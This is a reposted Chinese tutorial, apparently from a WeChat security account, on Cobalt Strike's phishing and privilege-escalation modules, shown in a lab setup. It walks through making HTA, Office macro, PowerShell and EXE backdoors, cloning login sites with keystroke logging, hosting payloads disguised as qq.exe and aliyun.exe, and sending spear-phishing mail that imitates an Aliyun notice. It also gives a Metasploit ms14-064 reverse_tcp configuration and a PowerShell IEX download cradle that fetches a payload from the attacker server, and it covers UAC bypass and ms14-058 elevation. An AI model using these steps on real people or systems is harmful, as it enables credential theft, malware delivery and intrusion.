> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NkdaVR7xCe7f90gCBJBaog)

作者：C1ay，授权转载于国科漏斗社区。

公众号

**一、前言**

由于 cobalt strike 各模块的使用内容比较多，因此斗哥分为上下两篇文章进行介绍，本篇文章是 cs 模块使用的下篇，主要介绍 CS 模块钓鱼攻击和权限提升的具体使用方式。   
关于本次教程对应的演示环境如下所示（小声逼逼，为了之后更好地给大家演示，斗哥还氪金买了阿里云）：

<table><tbody><tr><td width="55.33333333333333"><p><strong>系统</strong></p></td><td width="80.33333333333333"><p><strong>服务</strong></p></td><td width="103.33333333333333"><p><strong>ip</strong></p></td></tr><tr><td width="45.33333333333333"><p>kali</p></td><td width="83.33333333333333"><p>teamserver</p></td><td width="105.33333333333333"><p>192.168.0.107</p></td></tr><tr><td width="45.33333333333333"><p>win7sp1</p></td><td width="83.33333333333333"><p>测试主机 1(victim)</p></td><td width="105.33333333333333"><p>192.168.0.106</p></td></tr><tr><td width="45.33333333333333"><p>win2008</p></td><td width="83.33333333333333"><p>测试主机 2(victim)</p></td><td width="105.33333333333333"><p>192.168.0.108</p></td></tr></tbody></table>

  

**二、 钓鱼攻击**

**2.1 生成后门**

#### **1、hta 后门**

点击 Attacks->Packages->HTML Application。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXZkia40jHS3vdz3D500P7eQMWtoUnDy6ibjcfKNnlNoicXnRCKsibqQPhUw/640?wx_fmt=png)

选择监听器，通过 Generate 生成。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXibu3ib41sibPicweJmVMkXRHuicbblxkJ1CADhtSG0RibNjSdmJzhnjoma1g/640?wx_fmt=png)

注意：这里需要使用 powershell 的方式生成 hat 文件，否则会报错。

选择保存的路径即可。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXrftdW4icPJuGMeW8tibHicoRZx2na1onPnm0icaRBH3cLnMIuFPBsk3lVA/640?wx_fmt=png)

将生成的 hat 后门在目标机器上执行即可。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXEiak0dVLibh6BGXibro93lB3HIbpB2F3murw6Ep4gYs9tUsBNicgFSJjRQ/640?wx_fmt=png)

可以看到主机成功上线。

#### **2、宏病毒**

点击 Attacks->Packages->MS Office Macro。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjX8nibGvfagBAat7BW3Dibyzyj6x8AUBAdj9iaSuy6NYsaM7OGuQ29Nb9Kg/640?wx_fmt=png)

然后选择一个监听器，点击 Generate。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjX2QiabubWD9TbRoIO987LqynicdbnhsLR8t7N3LKibP8qrEjUDTySr7icibQ/640?wx_fmt=png)

然后点击 Copy Macro。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXgppW2HOr2OsicQSiahXRflRncF10N55Y41f2YpOT84D5dWJYcVTibXbyw/640?wx_fmt=png)

然后打开 word 编辑器，点击视图，然后点击宏。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXbnMHySQNWehJboz9sQKhwkTviajo2SPF7rEzGAXcbibmodA0BEkbBQlg/640?wx_fmt=png)

然后随便输入一个宏名，选择宏的位置，点击创建。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXsFzNFt2pegCPNF5vZmyiaxxN014eAZ6AW80uCW81uibdz5vu967F08dg/640?wx_fmt=png)

删除掉原来的代码，然后将复制的宏代码粘贴进去。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXDypswFn2SMSu5QP7l2mH6HbmPRcpXYr5Sa0H0uqG7icYw9lyubjicZTw/640?wx_fmt=png)

然后将文件另存为可启动宏的 docm 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXtndupD5AwkvAFgnS2ia6t1LYy0j2qdIYVB8U4Wh7EAhHQ553CLnPmBw/640?wx_fmt=png)

然后目标用户开启宏功能，主机就会成功在 CS 中上线。

查看宏功能开启情况可以在：文件 -> 选线 -> 信任中心 -> 信任中心设置 -> 宏设置。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXI2HXictnmBlzC64t5l2JvYWBiaTsFJNnunibzJbE1dzpedoFAyjn5T9CQ/640?wx_fmt=png)

可以看到，打开该文件后，目标主机成功上线，进程名为 rundll32.exe。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXA8ZazuciaekCZm7gF7OIP9lNcdd4nRwZKKSDGcnQRJ4zRYOzBDIia2xg/640?wx_fmt=png)

#### **3、Payload Generator**

点击 Attacks->Packages->Payload Generator

这个模块主要用于各种语言版本的 shellcode，然后通过其他语言进行编译生成。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjX7SOrc59K9BLNUjvrSQ5ozDGM3Uh1uNpiaibocKt0w0vPJPCibbzyNmT5w/640?wx_fmt=png)

这里演示一下 PowerShell 和 PowerShell Command 的使用方法。

首先演示一下 PowerShell 的使用方法。

先通过 generate 生成一个 payload.ps1 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXvibLjb1o8MDP37r7qHv1HVn2Feh1hgQy3svsIibkMIoajcom0MVtfUyg/640?wx_fmt=png)

将生成的 payload.ps1 保存下来，然后上传到目标机器上。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjX9NamJ3lpcYibLr0Jv3ksiarZzPru8yVwdJ3Qic65iaJibicGMWWNbsdGdN0Q/640?wx_fmt=png)

在 powershell 下执行如下命令，执行如下命令可以执行该脚本。

```
Import-Module .\payload.ps1或.\payload.ps1
```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXrQw99PmrR0wQiapHRsJwlaV9B1G7adSZKRQaYA1jrftEpb9yIkKibs1w/640?wx_fmt=png)

执行后，发现主机成功在 CS 中上线。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjX8P9NWwf26r5mCpXUgxU414F6Nr432ibg1GQNGrFrzRJWeBDyZhurNKw/640?wx_fmt=png)

然后演示一下 PowerShell Command 的使用。

先通过 generator 生成 payload.txt 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXq5LIvllYK6DtGLUJxYiabBkY0LGVaTjgwOic8UqbicCwZRU7MjEYEXnQg/640?wx_fmt=png)

将生成的 txt 文件保存到指定路径。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXJcEswoKujF9nS4YMwX6zVzcBqP3UqqYUibeib4yBuxISho7wAxcDqeDg/640?wx_fmt=png)

将 txt 的 ps 代码代码复制下来，在目标机器的 cmd 命令中运行即可。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXWTlkpdoXMXcPmlDrg8e5G7YwycbPA32Btz3JnUeO8n47djYlj5uiaJA/640?wx_fmt=png)

可以看到，目标主机成功在 CS 上线。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXxyG6l1KaCtEmsg0ic5DvZSrJcn0U002rkDdVf7z0XcE7D9Qu3EXxRVA/640?wx_fmt=png)

#### **4、Windows Executable**

点击 Attacks->Packages->Windows Executable。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXkMkicxgC7zqH8OWJVVCgGC6JUBtRliacTOXwm779DPFhqOMtVrLbcAjQ/640?wx_fmt=png)

选择相应的监听器，若目标操作系统是 64 位的话，可以选择勾选 x64。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXSDyxibHUMkYsPtCUFcW7A2R14FFZBsGpceWD0e629PGwnpogGQDHL8w/640?wx_fmt=png)

通过 Generate 生成 exe 可执行文件，保存到指定路径。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXTTD1wER4BXzymBIF4f8E01AiaMGicB2QsficcpcEf3r1uIhicEfd548Exg/640?wx_fmt=png)

将生成的文件上传到目标机器并执行，即可成功上线。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXsMp0ckYtA5HJaVicicvAQDbhiaIz16TGMXRn9LOVQ0lTFUet31Y57IdhQ/640?wx_fmt=png)

#### **5、Windows Executable（S）**

这里再详细介绍一下 Windows Executable 与 Windows Executable(S) 的差别。

这两个模块直接用于生成可执行的 exe 文件或 dl 文件。Windows Executable 是生成 Stager 类型的马，而 Windows Executable(S) 是生成 Stageless 类型的马。那 Stager 和 Stageless 有啥区别呢?.

●Stager 是分阶段传送 Payload。分阶段啥意思呢? 就是我们生成的 Stager 马其实是一个小程序，用于从服务器端下载我们真正的 shellcode。分阶段在很多时候是很有必要的，因为很多场景对于能加载进内存并成功漏洞利用后执行的数据大小存在严格限制。所以这种时候，我们就不得不利用分阶段传送了。如果不需要分阶段的话，可以在 C2 的扩展文件里面把 host_stage 选项设置为 false。

●而 Stageless 是完整的木马，后续不需要再向服务器端请求 shellcode。所以使用这种方法生成的木马会比 Stager 生成的木马体积要大。但是这种木马有助于避免反溯源，因为如果开启了分阶段传送，任何人都能连接到你的 C2 服务器请求 payload，并分析 payload 中的配置信息。在 CobaltStrike4.0 及以后的版本中，后渗透和横向移动绝大部分是使用的 Stageless 类型的木马。

点击 Attacks->Packages->Windows Executable。

选择对应的监听器和输出格式。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjX8Me2lQXXbibdoY8zIp46ZgPbRzWpYRJsibicFwakLbhZWfFGOJGBia4ibpQ/640?wx_fmt=png)

然后将生成的文件上传到目标机器上执行即可成功上线。

**2.2 钓鱼模块**

#### **1、Manage**

点击 Attacks->Web Drive-by->Manage。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXPWDiaRaPcc6J0VWibbTC40YgZ146iakAEYLOJeNvuh20sUibWT0FduGqSA/640?wx_fmt=png)

该模块可以查询现在能使用的模块代码。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXMqDJ5hPhCRbyXX2ITA2ZvicplCKhhvbXlBwFTsBGc6ofmFrKL2UXiayw/640?wx_fmt=png)

#### **2、System Profiler**

点击 Attacks->Web Drive-by->System Profiler。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXag01hdqlp7a7wMick5mgrUJVJP705IxZue5Ym9WWS1dcRbuvsCWlQ4g/640?wx_fmt=png)

填写上本地路径和需要跳转到的 URL 地址。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjX7944uAk8X4BbJUR0u5iacQaRm9xj4Vbicg5E7AV1UNtzXxNYu92FEVibw/640?wx_fmt=png)

点击 Launch 会生成一个链接。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXqN9vDdyrmerib1og0Y5jstJTzjIaLDdLwgmJWNNibuf2MhVibz0UUceKw/640?wx_fmt=png)

将生成的链接发送给用户，若用户点击即可收集用户系统和客户端浏览器信息。收集的信息可以点击 View->Web Log 进行查看。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXRPVD3B1ibawwzNHEXaGWuxziaiaAjq2HOl5zTAZDVsAf2kHicIUHkpJficw/640?wx_fmt=png)

也可以点击 View->Applications 进行查看。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXRPVD3B1ibawwzNHEXaGWuxziaiaAjq2HOl5zTAZDVsAf2kHicIUHkpJficw/640?wx_fmt=png)

#### **3、Clone Site**

点击 Attacks->Web Drive-by->Clone Site。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXH9fPRNpibIae2icmU7iaVoEFyads3xNia6EVCDibB1meuRwcza82dG9H9bw/640?wx_fmt=png)

填写需要克隆的网站 url 地址、本地的 url 地址、以及对应的端口号即可，这里记得要开启键盘记录。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXmzRMJPibWcgX7ewSp8zNB0ze1KqkiaQPBWKhhJZdhpHTsn5dwViaQdKSg/640?wx_fmt=png)

点击 Clone 会生成一个链接。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXp9aPiaMNvC9WzFwSu1oOlEf0uTjhWMF0Hvacad8f1Rywwhc3JwzCZ4Q/640?wx_fmt=png)

将生成的链接发送给目标用户，若目标用户输入账号及密码进行登录，我们就可以在 View->Web Log 中得到用户输入的内容。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXM2ysdmqGEr9s4wFa7EnbcW9uNhpUvjdXTNqQds5iaLXBjSypPeklUgQ/640?wx_fmt=png)

#### **4、Host File**

点击 Attacks->Web Drive-by->Host File。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXUL6VLAVTtAJ1zU7Nv1TutEr3QvPVeRibfzN4Z3ltmpmk38sTia8QwazQ/640?wx_fmt=png)

上传文件 artifact.exe，填入本地的 URL、Host 及端口即可。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXwPzcBRCX7sJROD3VAxGVTqtXkdD8MwaYVfHx8eCwMdHdHQcicCaiaRMA/640?wx_fmt=png)

点击 launch 生成下载链接。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXy89z2rD93eDmXPCkFbJWVCiaHzgoZrdPx5MMO7cp2Blfpmibu3LF9iayw/640?wx_fmt=png)

将生成的下载链接发送给目标用户，若目标用户访问链接并运行了下载文件。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXrAlDZetvumficBFuXibVk3zh1oS4JcibmOBfbK2eRicic5UJjiakWmPUbytg/640?wx_fmt=png)

目标主机就会成功上线。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXbSSRbRiaeZgia75GDTGKkTrhXCeHyK1MLuOoLtdIoA0SCNmrW6ibwvicyA/640?wx_fmt=png)

网站下载模块也可以与网站克隆模块进行组合使用，具体如下。

首先克隆一个网站，然后填入需要克隆的 URL 地址，然后在 Attack 中添加刚刚生成的下载链接即可。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXuQwXcEZPRN1NCER8uxu3Jpr72nh2nJS1W7YvKxzh8ZYZmJcYxLZHqA/640?wx_fmt=png)

点击 Clone，会生成一个链接。将生成的链接发送给目标用户，在目标用户访问时会提示是否下载 qq.exe 文件，当客户端下载并点击运行时，Cobalt Strike 监听到有受害人来的信息就会产生通信进行会话。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXubuicC97VrS3fVxuiaZxxEsWOK8QhhDMcCPaicka76vFp5InnYb8Ho9Og/640?wx_fmt=png)

#### **5、Clone Site + msf**

这里我们使用 metasploit 中的 ms14-064 溢出漏洞与 Cobalt Strik 进行钓鱼攻击。具体步骤如下：

打开 metasploit，使用 ms14-064 模块，并如下配置参数。

```
use exploit/windows/browser/ms14_064_ole_code_executionset SRVHOST 192.168.0.7set SRVPORT 8888set payload windows/meterpreter/reverse_tcpset lhost 192.168.0.134set lport 6666exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXD71aXwyTBQTuh7zlv5iaIFc5gNrxia7SMfeZM60ibf2VicU9Nc5jpJabTQ/640?wx_fmt=png)

然后通过 exploit -j 生成利用代码。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXwA1Yf7V2WpBHWeMStrVpTIwH8W0ayqmZfiaKk6hSVXfsLVeQ8eEgeRw/640?wx_fmt=png)

打开 CS 中的 Clone Site 模块，输入需要克隆的网站地址及本地的 URL 等信息。然后在 Attack 中填入刚刚生成的溢出利用代码。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXd6HKQUfIXiaibWUgm2rYYrIeAQ3QLAibR8VUwsJOUYWaPFnupQKW2HSEw/640?wx_fmt=png)

然后通过 Clone 生成一个链接，将链接发送给目标用户。若目标用户使用 IE 浏览器访问链接，便会返回 meterpreter 通道。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXF5PeU2pqTSR9H8WwLVGyria858Q0CJLvG30j927jndwMpP1eapu6XVw/640?wx_fmt=png)

#### **6、Spear Phish**

这里简单介绍一下该模块。

Spear Phish 又叫鱼叉式网络钓鱼（Spear phishing）指一种源于亚洲与东欧只针对特定目标进行攻击的网络钓鱼攻击。

由于鱼叉式网络钓鱼锁定之对象并非一般个人，而是特定公司、组织之成员，故受窃之资讯已非一般网络钓鱼所窃取之个人资料，而是其他高度敏感性资料，如知识产权及商业机密。

网络钓鱼是指诱导人们连接那些黑客已经锁定的目标。这种攻击方法的成功率很高，也非常常见。点击链接、打开表格或者连接其他一些文件都会感染病毒。一次简单的点击相当于为攻击者开启了一扇电子门，这样他就可以接触到你的内部弱点了。因为你已经同意他进入，他能够接触弱点，然后挖掘信息和授权连接。

点击 Attacks->Spear Phish。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXGSCibxN2Z1xFaKQpYY3DVsfxwKOvv9XBwYKHbx108zoiakHE3ma3TcsQ/640?wx_fmt=png)

下面简单介绍一下需要我们配置的一些参数。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXUhibOFrEFuJyhDic7z9ZoFZcUtx3qiaZ91oibVG784M19Or38160Uf1CGg/640?wx_fmt=png)

targets 是要发送邮箱地址的文件：比如

```
123123@qq.comadmin@qq.comadmin@163.com
```

template 是要发送邮件的模板，这个可以在个人邮箱中导出一个即可。

attachment 放入我们制作好的宏病毒。

embed url 填写我们制作好的钓鱼网站

Mail Server 填写本地搭建或者网上公开使用的 smtp 服务器

Bounce To 模仿发件人，自己添写即可

首先先要创建一个文件，用于存放要进行钓鱼攻击的邮箱。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXWjJRFicF4aibJrDof8qAYY06giaqSnXPWpnbW6hYJvRQGhdwAMQuDyIAA/640?wx_fmt=png)

然后再看看怎么导出模板文件，具体步骤如下。

1. 打开 qq 邮箱，选择需要导出的模板文件，这里我以阿里云备案的邮件为例。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXAXacIibDz3sEvofibjCklXicuLsZGVl7DzNOlzlW02c5uKMK0M0KgjJ5A/640?wx_fmt=png)

2. 选择导出为 eml 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXnI9xMbN1goMKicO9icicZic6ico3cRA5cziaxfEUWSXp8HPWMoYmCWahGJ8w/640?wx_fmt=png)

3. 然后将导出的文件保存到指定路径即可。

再导出模板文件以后，我们需要先开启 smtp 服务器，这里以网易邮箱为例。

1. 在 https://mail.163.com / 注册一个 163 邮箱。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXJFscsJ3yeZt4QAL6lbLCgTZPNROXGZiaW4LTO8O8yN8sKlrqcEbCT6Q/640?wx_fmt=png)

2. 登陆邮箱，开启 smtp 服务。  

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXQN3bpxiaDCyiaD8Q8kfz2pmcsnuibvTqImniaRagXBeiaAgPhobWXv7B6ng/640?wx_fmt=png)

在开启 smtp 服务时，系统会要求你发送一条短信。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXYSOcic430GFwhuMOtmLBzoVvZFxXPmSRhgEMQrN74s838iaXaxG3mhHg/640?wx_fmt=png)

在发送完短信以后，系统会给我们一个授权密码，用于在第三方服务器上使用 smtp 服务。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXl9lDxNCR3GukVuWwEdWibLibnhkGv5xzPIZOtD7U9Yc9UgwHGDKWWxvg/640?wx_fmt=png)

最后通过 clone site 创建一个钓鱼网站，进行钓鱼攻击，这里以克隆 tom 邮箱为例。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXxCY1oiccuZIgHCPSoib8yXaR7daDrsaiawR4duQniaTlKjQyfTrKcJ5iayA/640?wx_fmt=png)

准备就绪，现在开始制作钓鱼邮件，填入需要进行填写的内容。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXW9YLTthibQmPIt6dTFCDxY3jCSEztnribXMv6aI2XlvOvOojrqFydicicw/640?wx_fmt=png)

查看 send email，可以发现邮件成功发送。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXNtZ3muia9QzxA9ESdP33SjfciaZRKR8BX6TnTrDQMa2gISR5w4kBEBpA/640?wx_fmt=png)

这时候打开邮箱，也可以看到成功收到了邮件。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjX8Z6L7H3Jkhp0pVOwYUnU1YZtNgUHS8yfV0Nibv2lcriaQhFn7NyG5H3A/640?wx_fmt=png)

这时候若目标用户下载附件并打开，且在 office 开启了宏功能。主机就会成功上线。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXSS2rvib0Rgon6gVa3MGP9bFdQLLWcaajNzmlaGlD68YO26rTPG7j0og/640?wx_fmt=png)

在用户点击任意链接后，就会跳转到我们所创建的钓鱼网站，并会提示是否下载 aliyun.exe。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXBIlcuoV3LoI9ACYfvAvp0LnDiaZH1EXIaNib8wLkJfGyMuyfWglE7RMQ/640?wx_fmt=png)

若用户点击保存并运行，主机也会成功上线。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXJvOC4193l7ZF0h8ef9DZRVSbTHe0eNazIMDWrb68AJhCgdrpa5L2Ww/640?wx_fmt=png)

而且如果目标主机在登陆框中输入了用户名密码，输入的内容也将被我们所得到。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXNxwshdO4PRxiaoEoQLERITCIAXniaIgsG9pktCpsY36j45icTNjBYYq9w/640?wx_fmt=png)

#### **7、Scripted Web Delivery（S）**

点击 Attacks->Web Drive-by->Scripted Web Delivery（S）

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXLRAkS8NibJCR56LuNyicYSjJ5ncFJj5LDBICJOMoPdVBBS7s8f7gX5qQ/640?wx_fmt=png)

设置监听器，选择需要使用的 payload 类型，这里以 powershell 为例。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXjVDJ49tMbdEcXmmib874anCIlNlwIdOB3SfKRz80FK8PzibRwYRkoeGQ/640?wx_fmt=png)

点击 launch 后，会生成一段 powershell 利用代码。

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.0.107:80/a'))"
```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXcPR4JhP9ENKr19U3nNia26lgYNICKPVDFOUjMgPRC5KV3YGqzGkLEog/640?wx_fmt=png)

在目标机器上执行这段代码，就会从服务器上下载后门文件，主机就会成功上线。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXfgNSD5iczCEOKeT4ayNAVgyj65rQjlOSwI0ZMIcY1u00I403eibHCfibA/640?wx_fmt=png)

**三、权限提升**

当获取的当前权限不够的时候，可以使用提权模块。

右键点击需要提权的会话，点击 Access->Elevate。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXd7UN78iaTZpfDOGcs8dWE8T3BCl62ic8mjvqJStNBmdzmc4wNPtcGdew/640?wx_fmt=png)

Cobalt Strike 默认有三个提权 payload 可以使用，ms14-058、uac-dll、uac-token-duplication。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXVMoUbbfH1on6Ph0ficucCdfbQviaTC3FFRK9ofm20VEalK2OOI85qfYA/640?wx_fmt=png)

我们也可以自己加入一些提权脚本进去。在 Github 上有一个提权工具包，使用这个提权工具包可以增加几种提权方法：https://github.com/rsmudge/ElevateKit 。我们下载好该提权工具包后点击 ->Cobalt Strike->Script Manager，点击 load。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjX3h69vcrKRkYaTyIrlFXfkYIBnkDkEyENKYlQCVBiaEYibylqqO7AViaBg/640?wx_fmt=png)

选择刚刚下载好的 elevate-cna 文件，点击 load 导入即可。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXc1A6edZzruUm0Vpl3OhmuibN5NibR20AAEe7Ru1ZZ1WrO1BunksldyiaA/640?wx_fmt=png)

### **1、BypassUAC**

UAC 是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。

在 3.X 版本的 Cobalt Strike 中默认集成该模块。

powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘http://192.168.123.183:80/a‘))”

使用步骤如下：

直接在命令行输入 bypassuac，选择对应的监听器即可。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjX68KOSHXst46w77dsJEZJuCcnH1ULlRO4GFgowFfApGWiaTHKKdhFckA/640?wx_fmt=png)

提权成功后，会返回一个带有 * 号的会话，* 表示具有管理员权限。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXLQQJic26veC9VYKbr3HB2AKZB66JyTd5LfEDf9JRmXsHwR5YlpYO4cQ/640?wx_fmt=png)

**2、ms14-058**

漏洞介绍和影响范围可参考：https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2014/ms14-058

右键点击 Access->Elevate。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXzIFyNAcWvIc8AViamb9ibu2ZULtvKfCia6cSSibU21ju0qO2VtSKhHX8RQ/640?wx_fmt=png)

选择需要使用的提权脚本，这里我们选择 ms14-058，然后新建一个 smb 的监听器。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXwDcXibDwEr1zMFXJm6wME4OJUqUaYHicZJwHF7KUiaT2Yiap4ibxNg5ESIQ/640?wx_fmt=png)

SMB Beacon 使用命名管道与父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHiaOq0KEGIwnSwnrliboFXGjXXaDIm6iaG6vmPTc6fXuW4W3tM2J2GfZQ6t4Qvfmlj7jtBz76CpDPNXw/640?wx_fmt=png)

可以看到成功返回了一个系统权限。

其他提权的脚本大家也可以自行尝试，这里就不再赘述了。

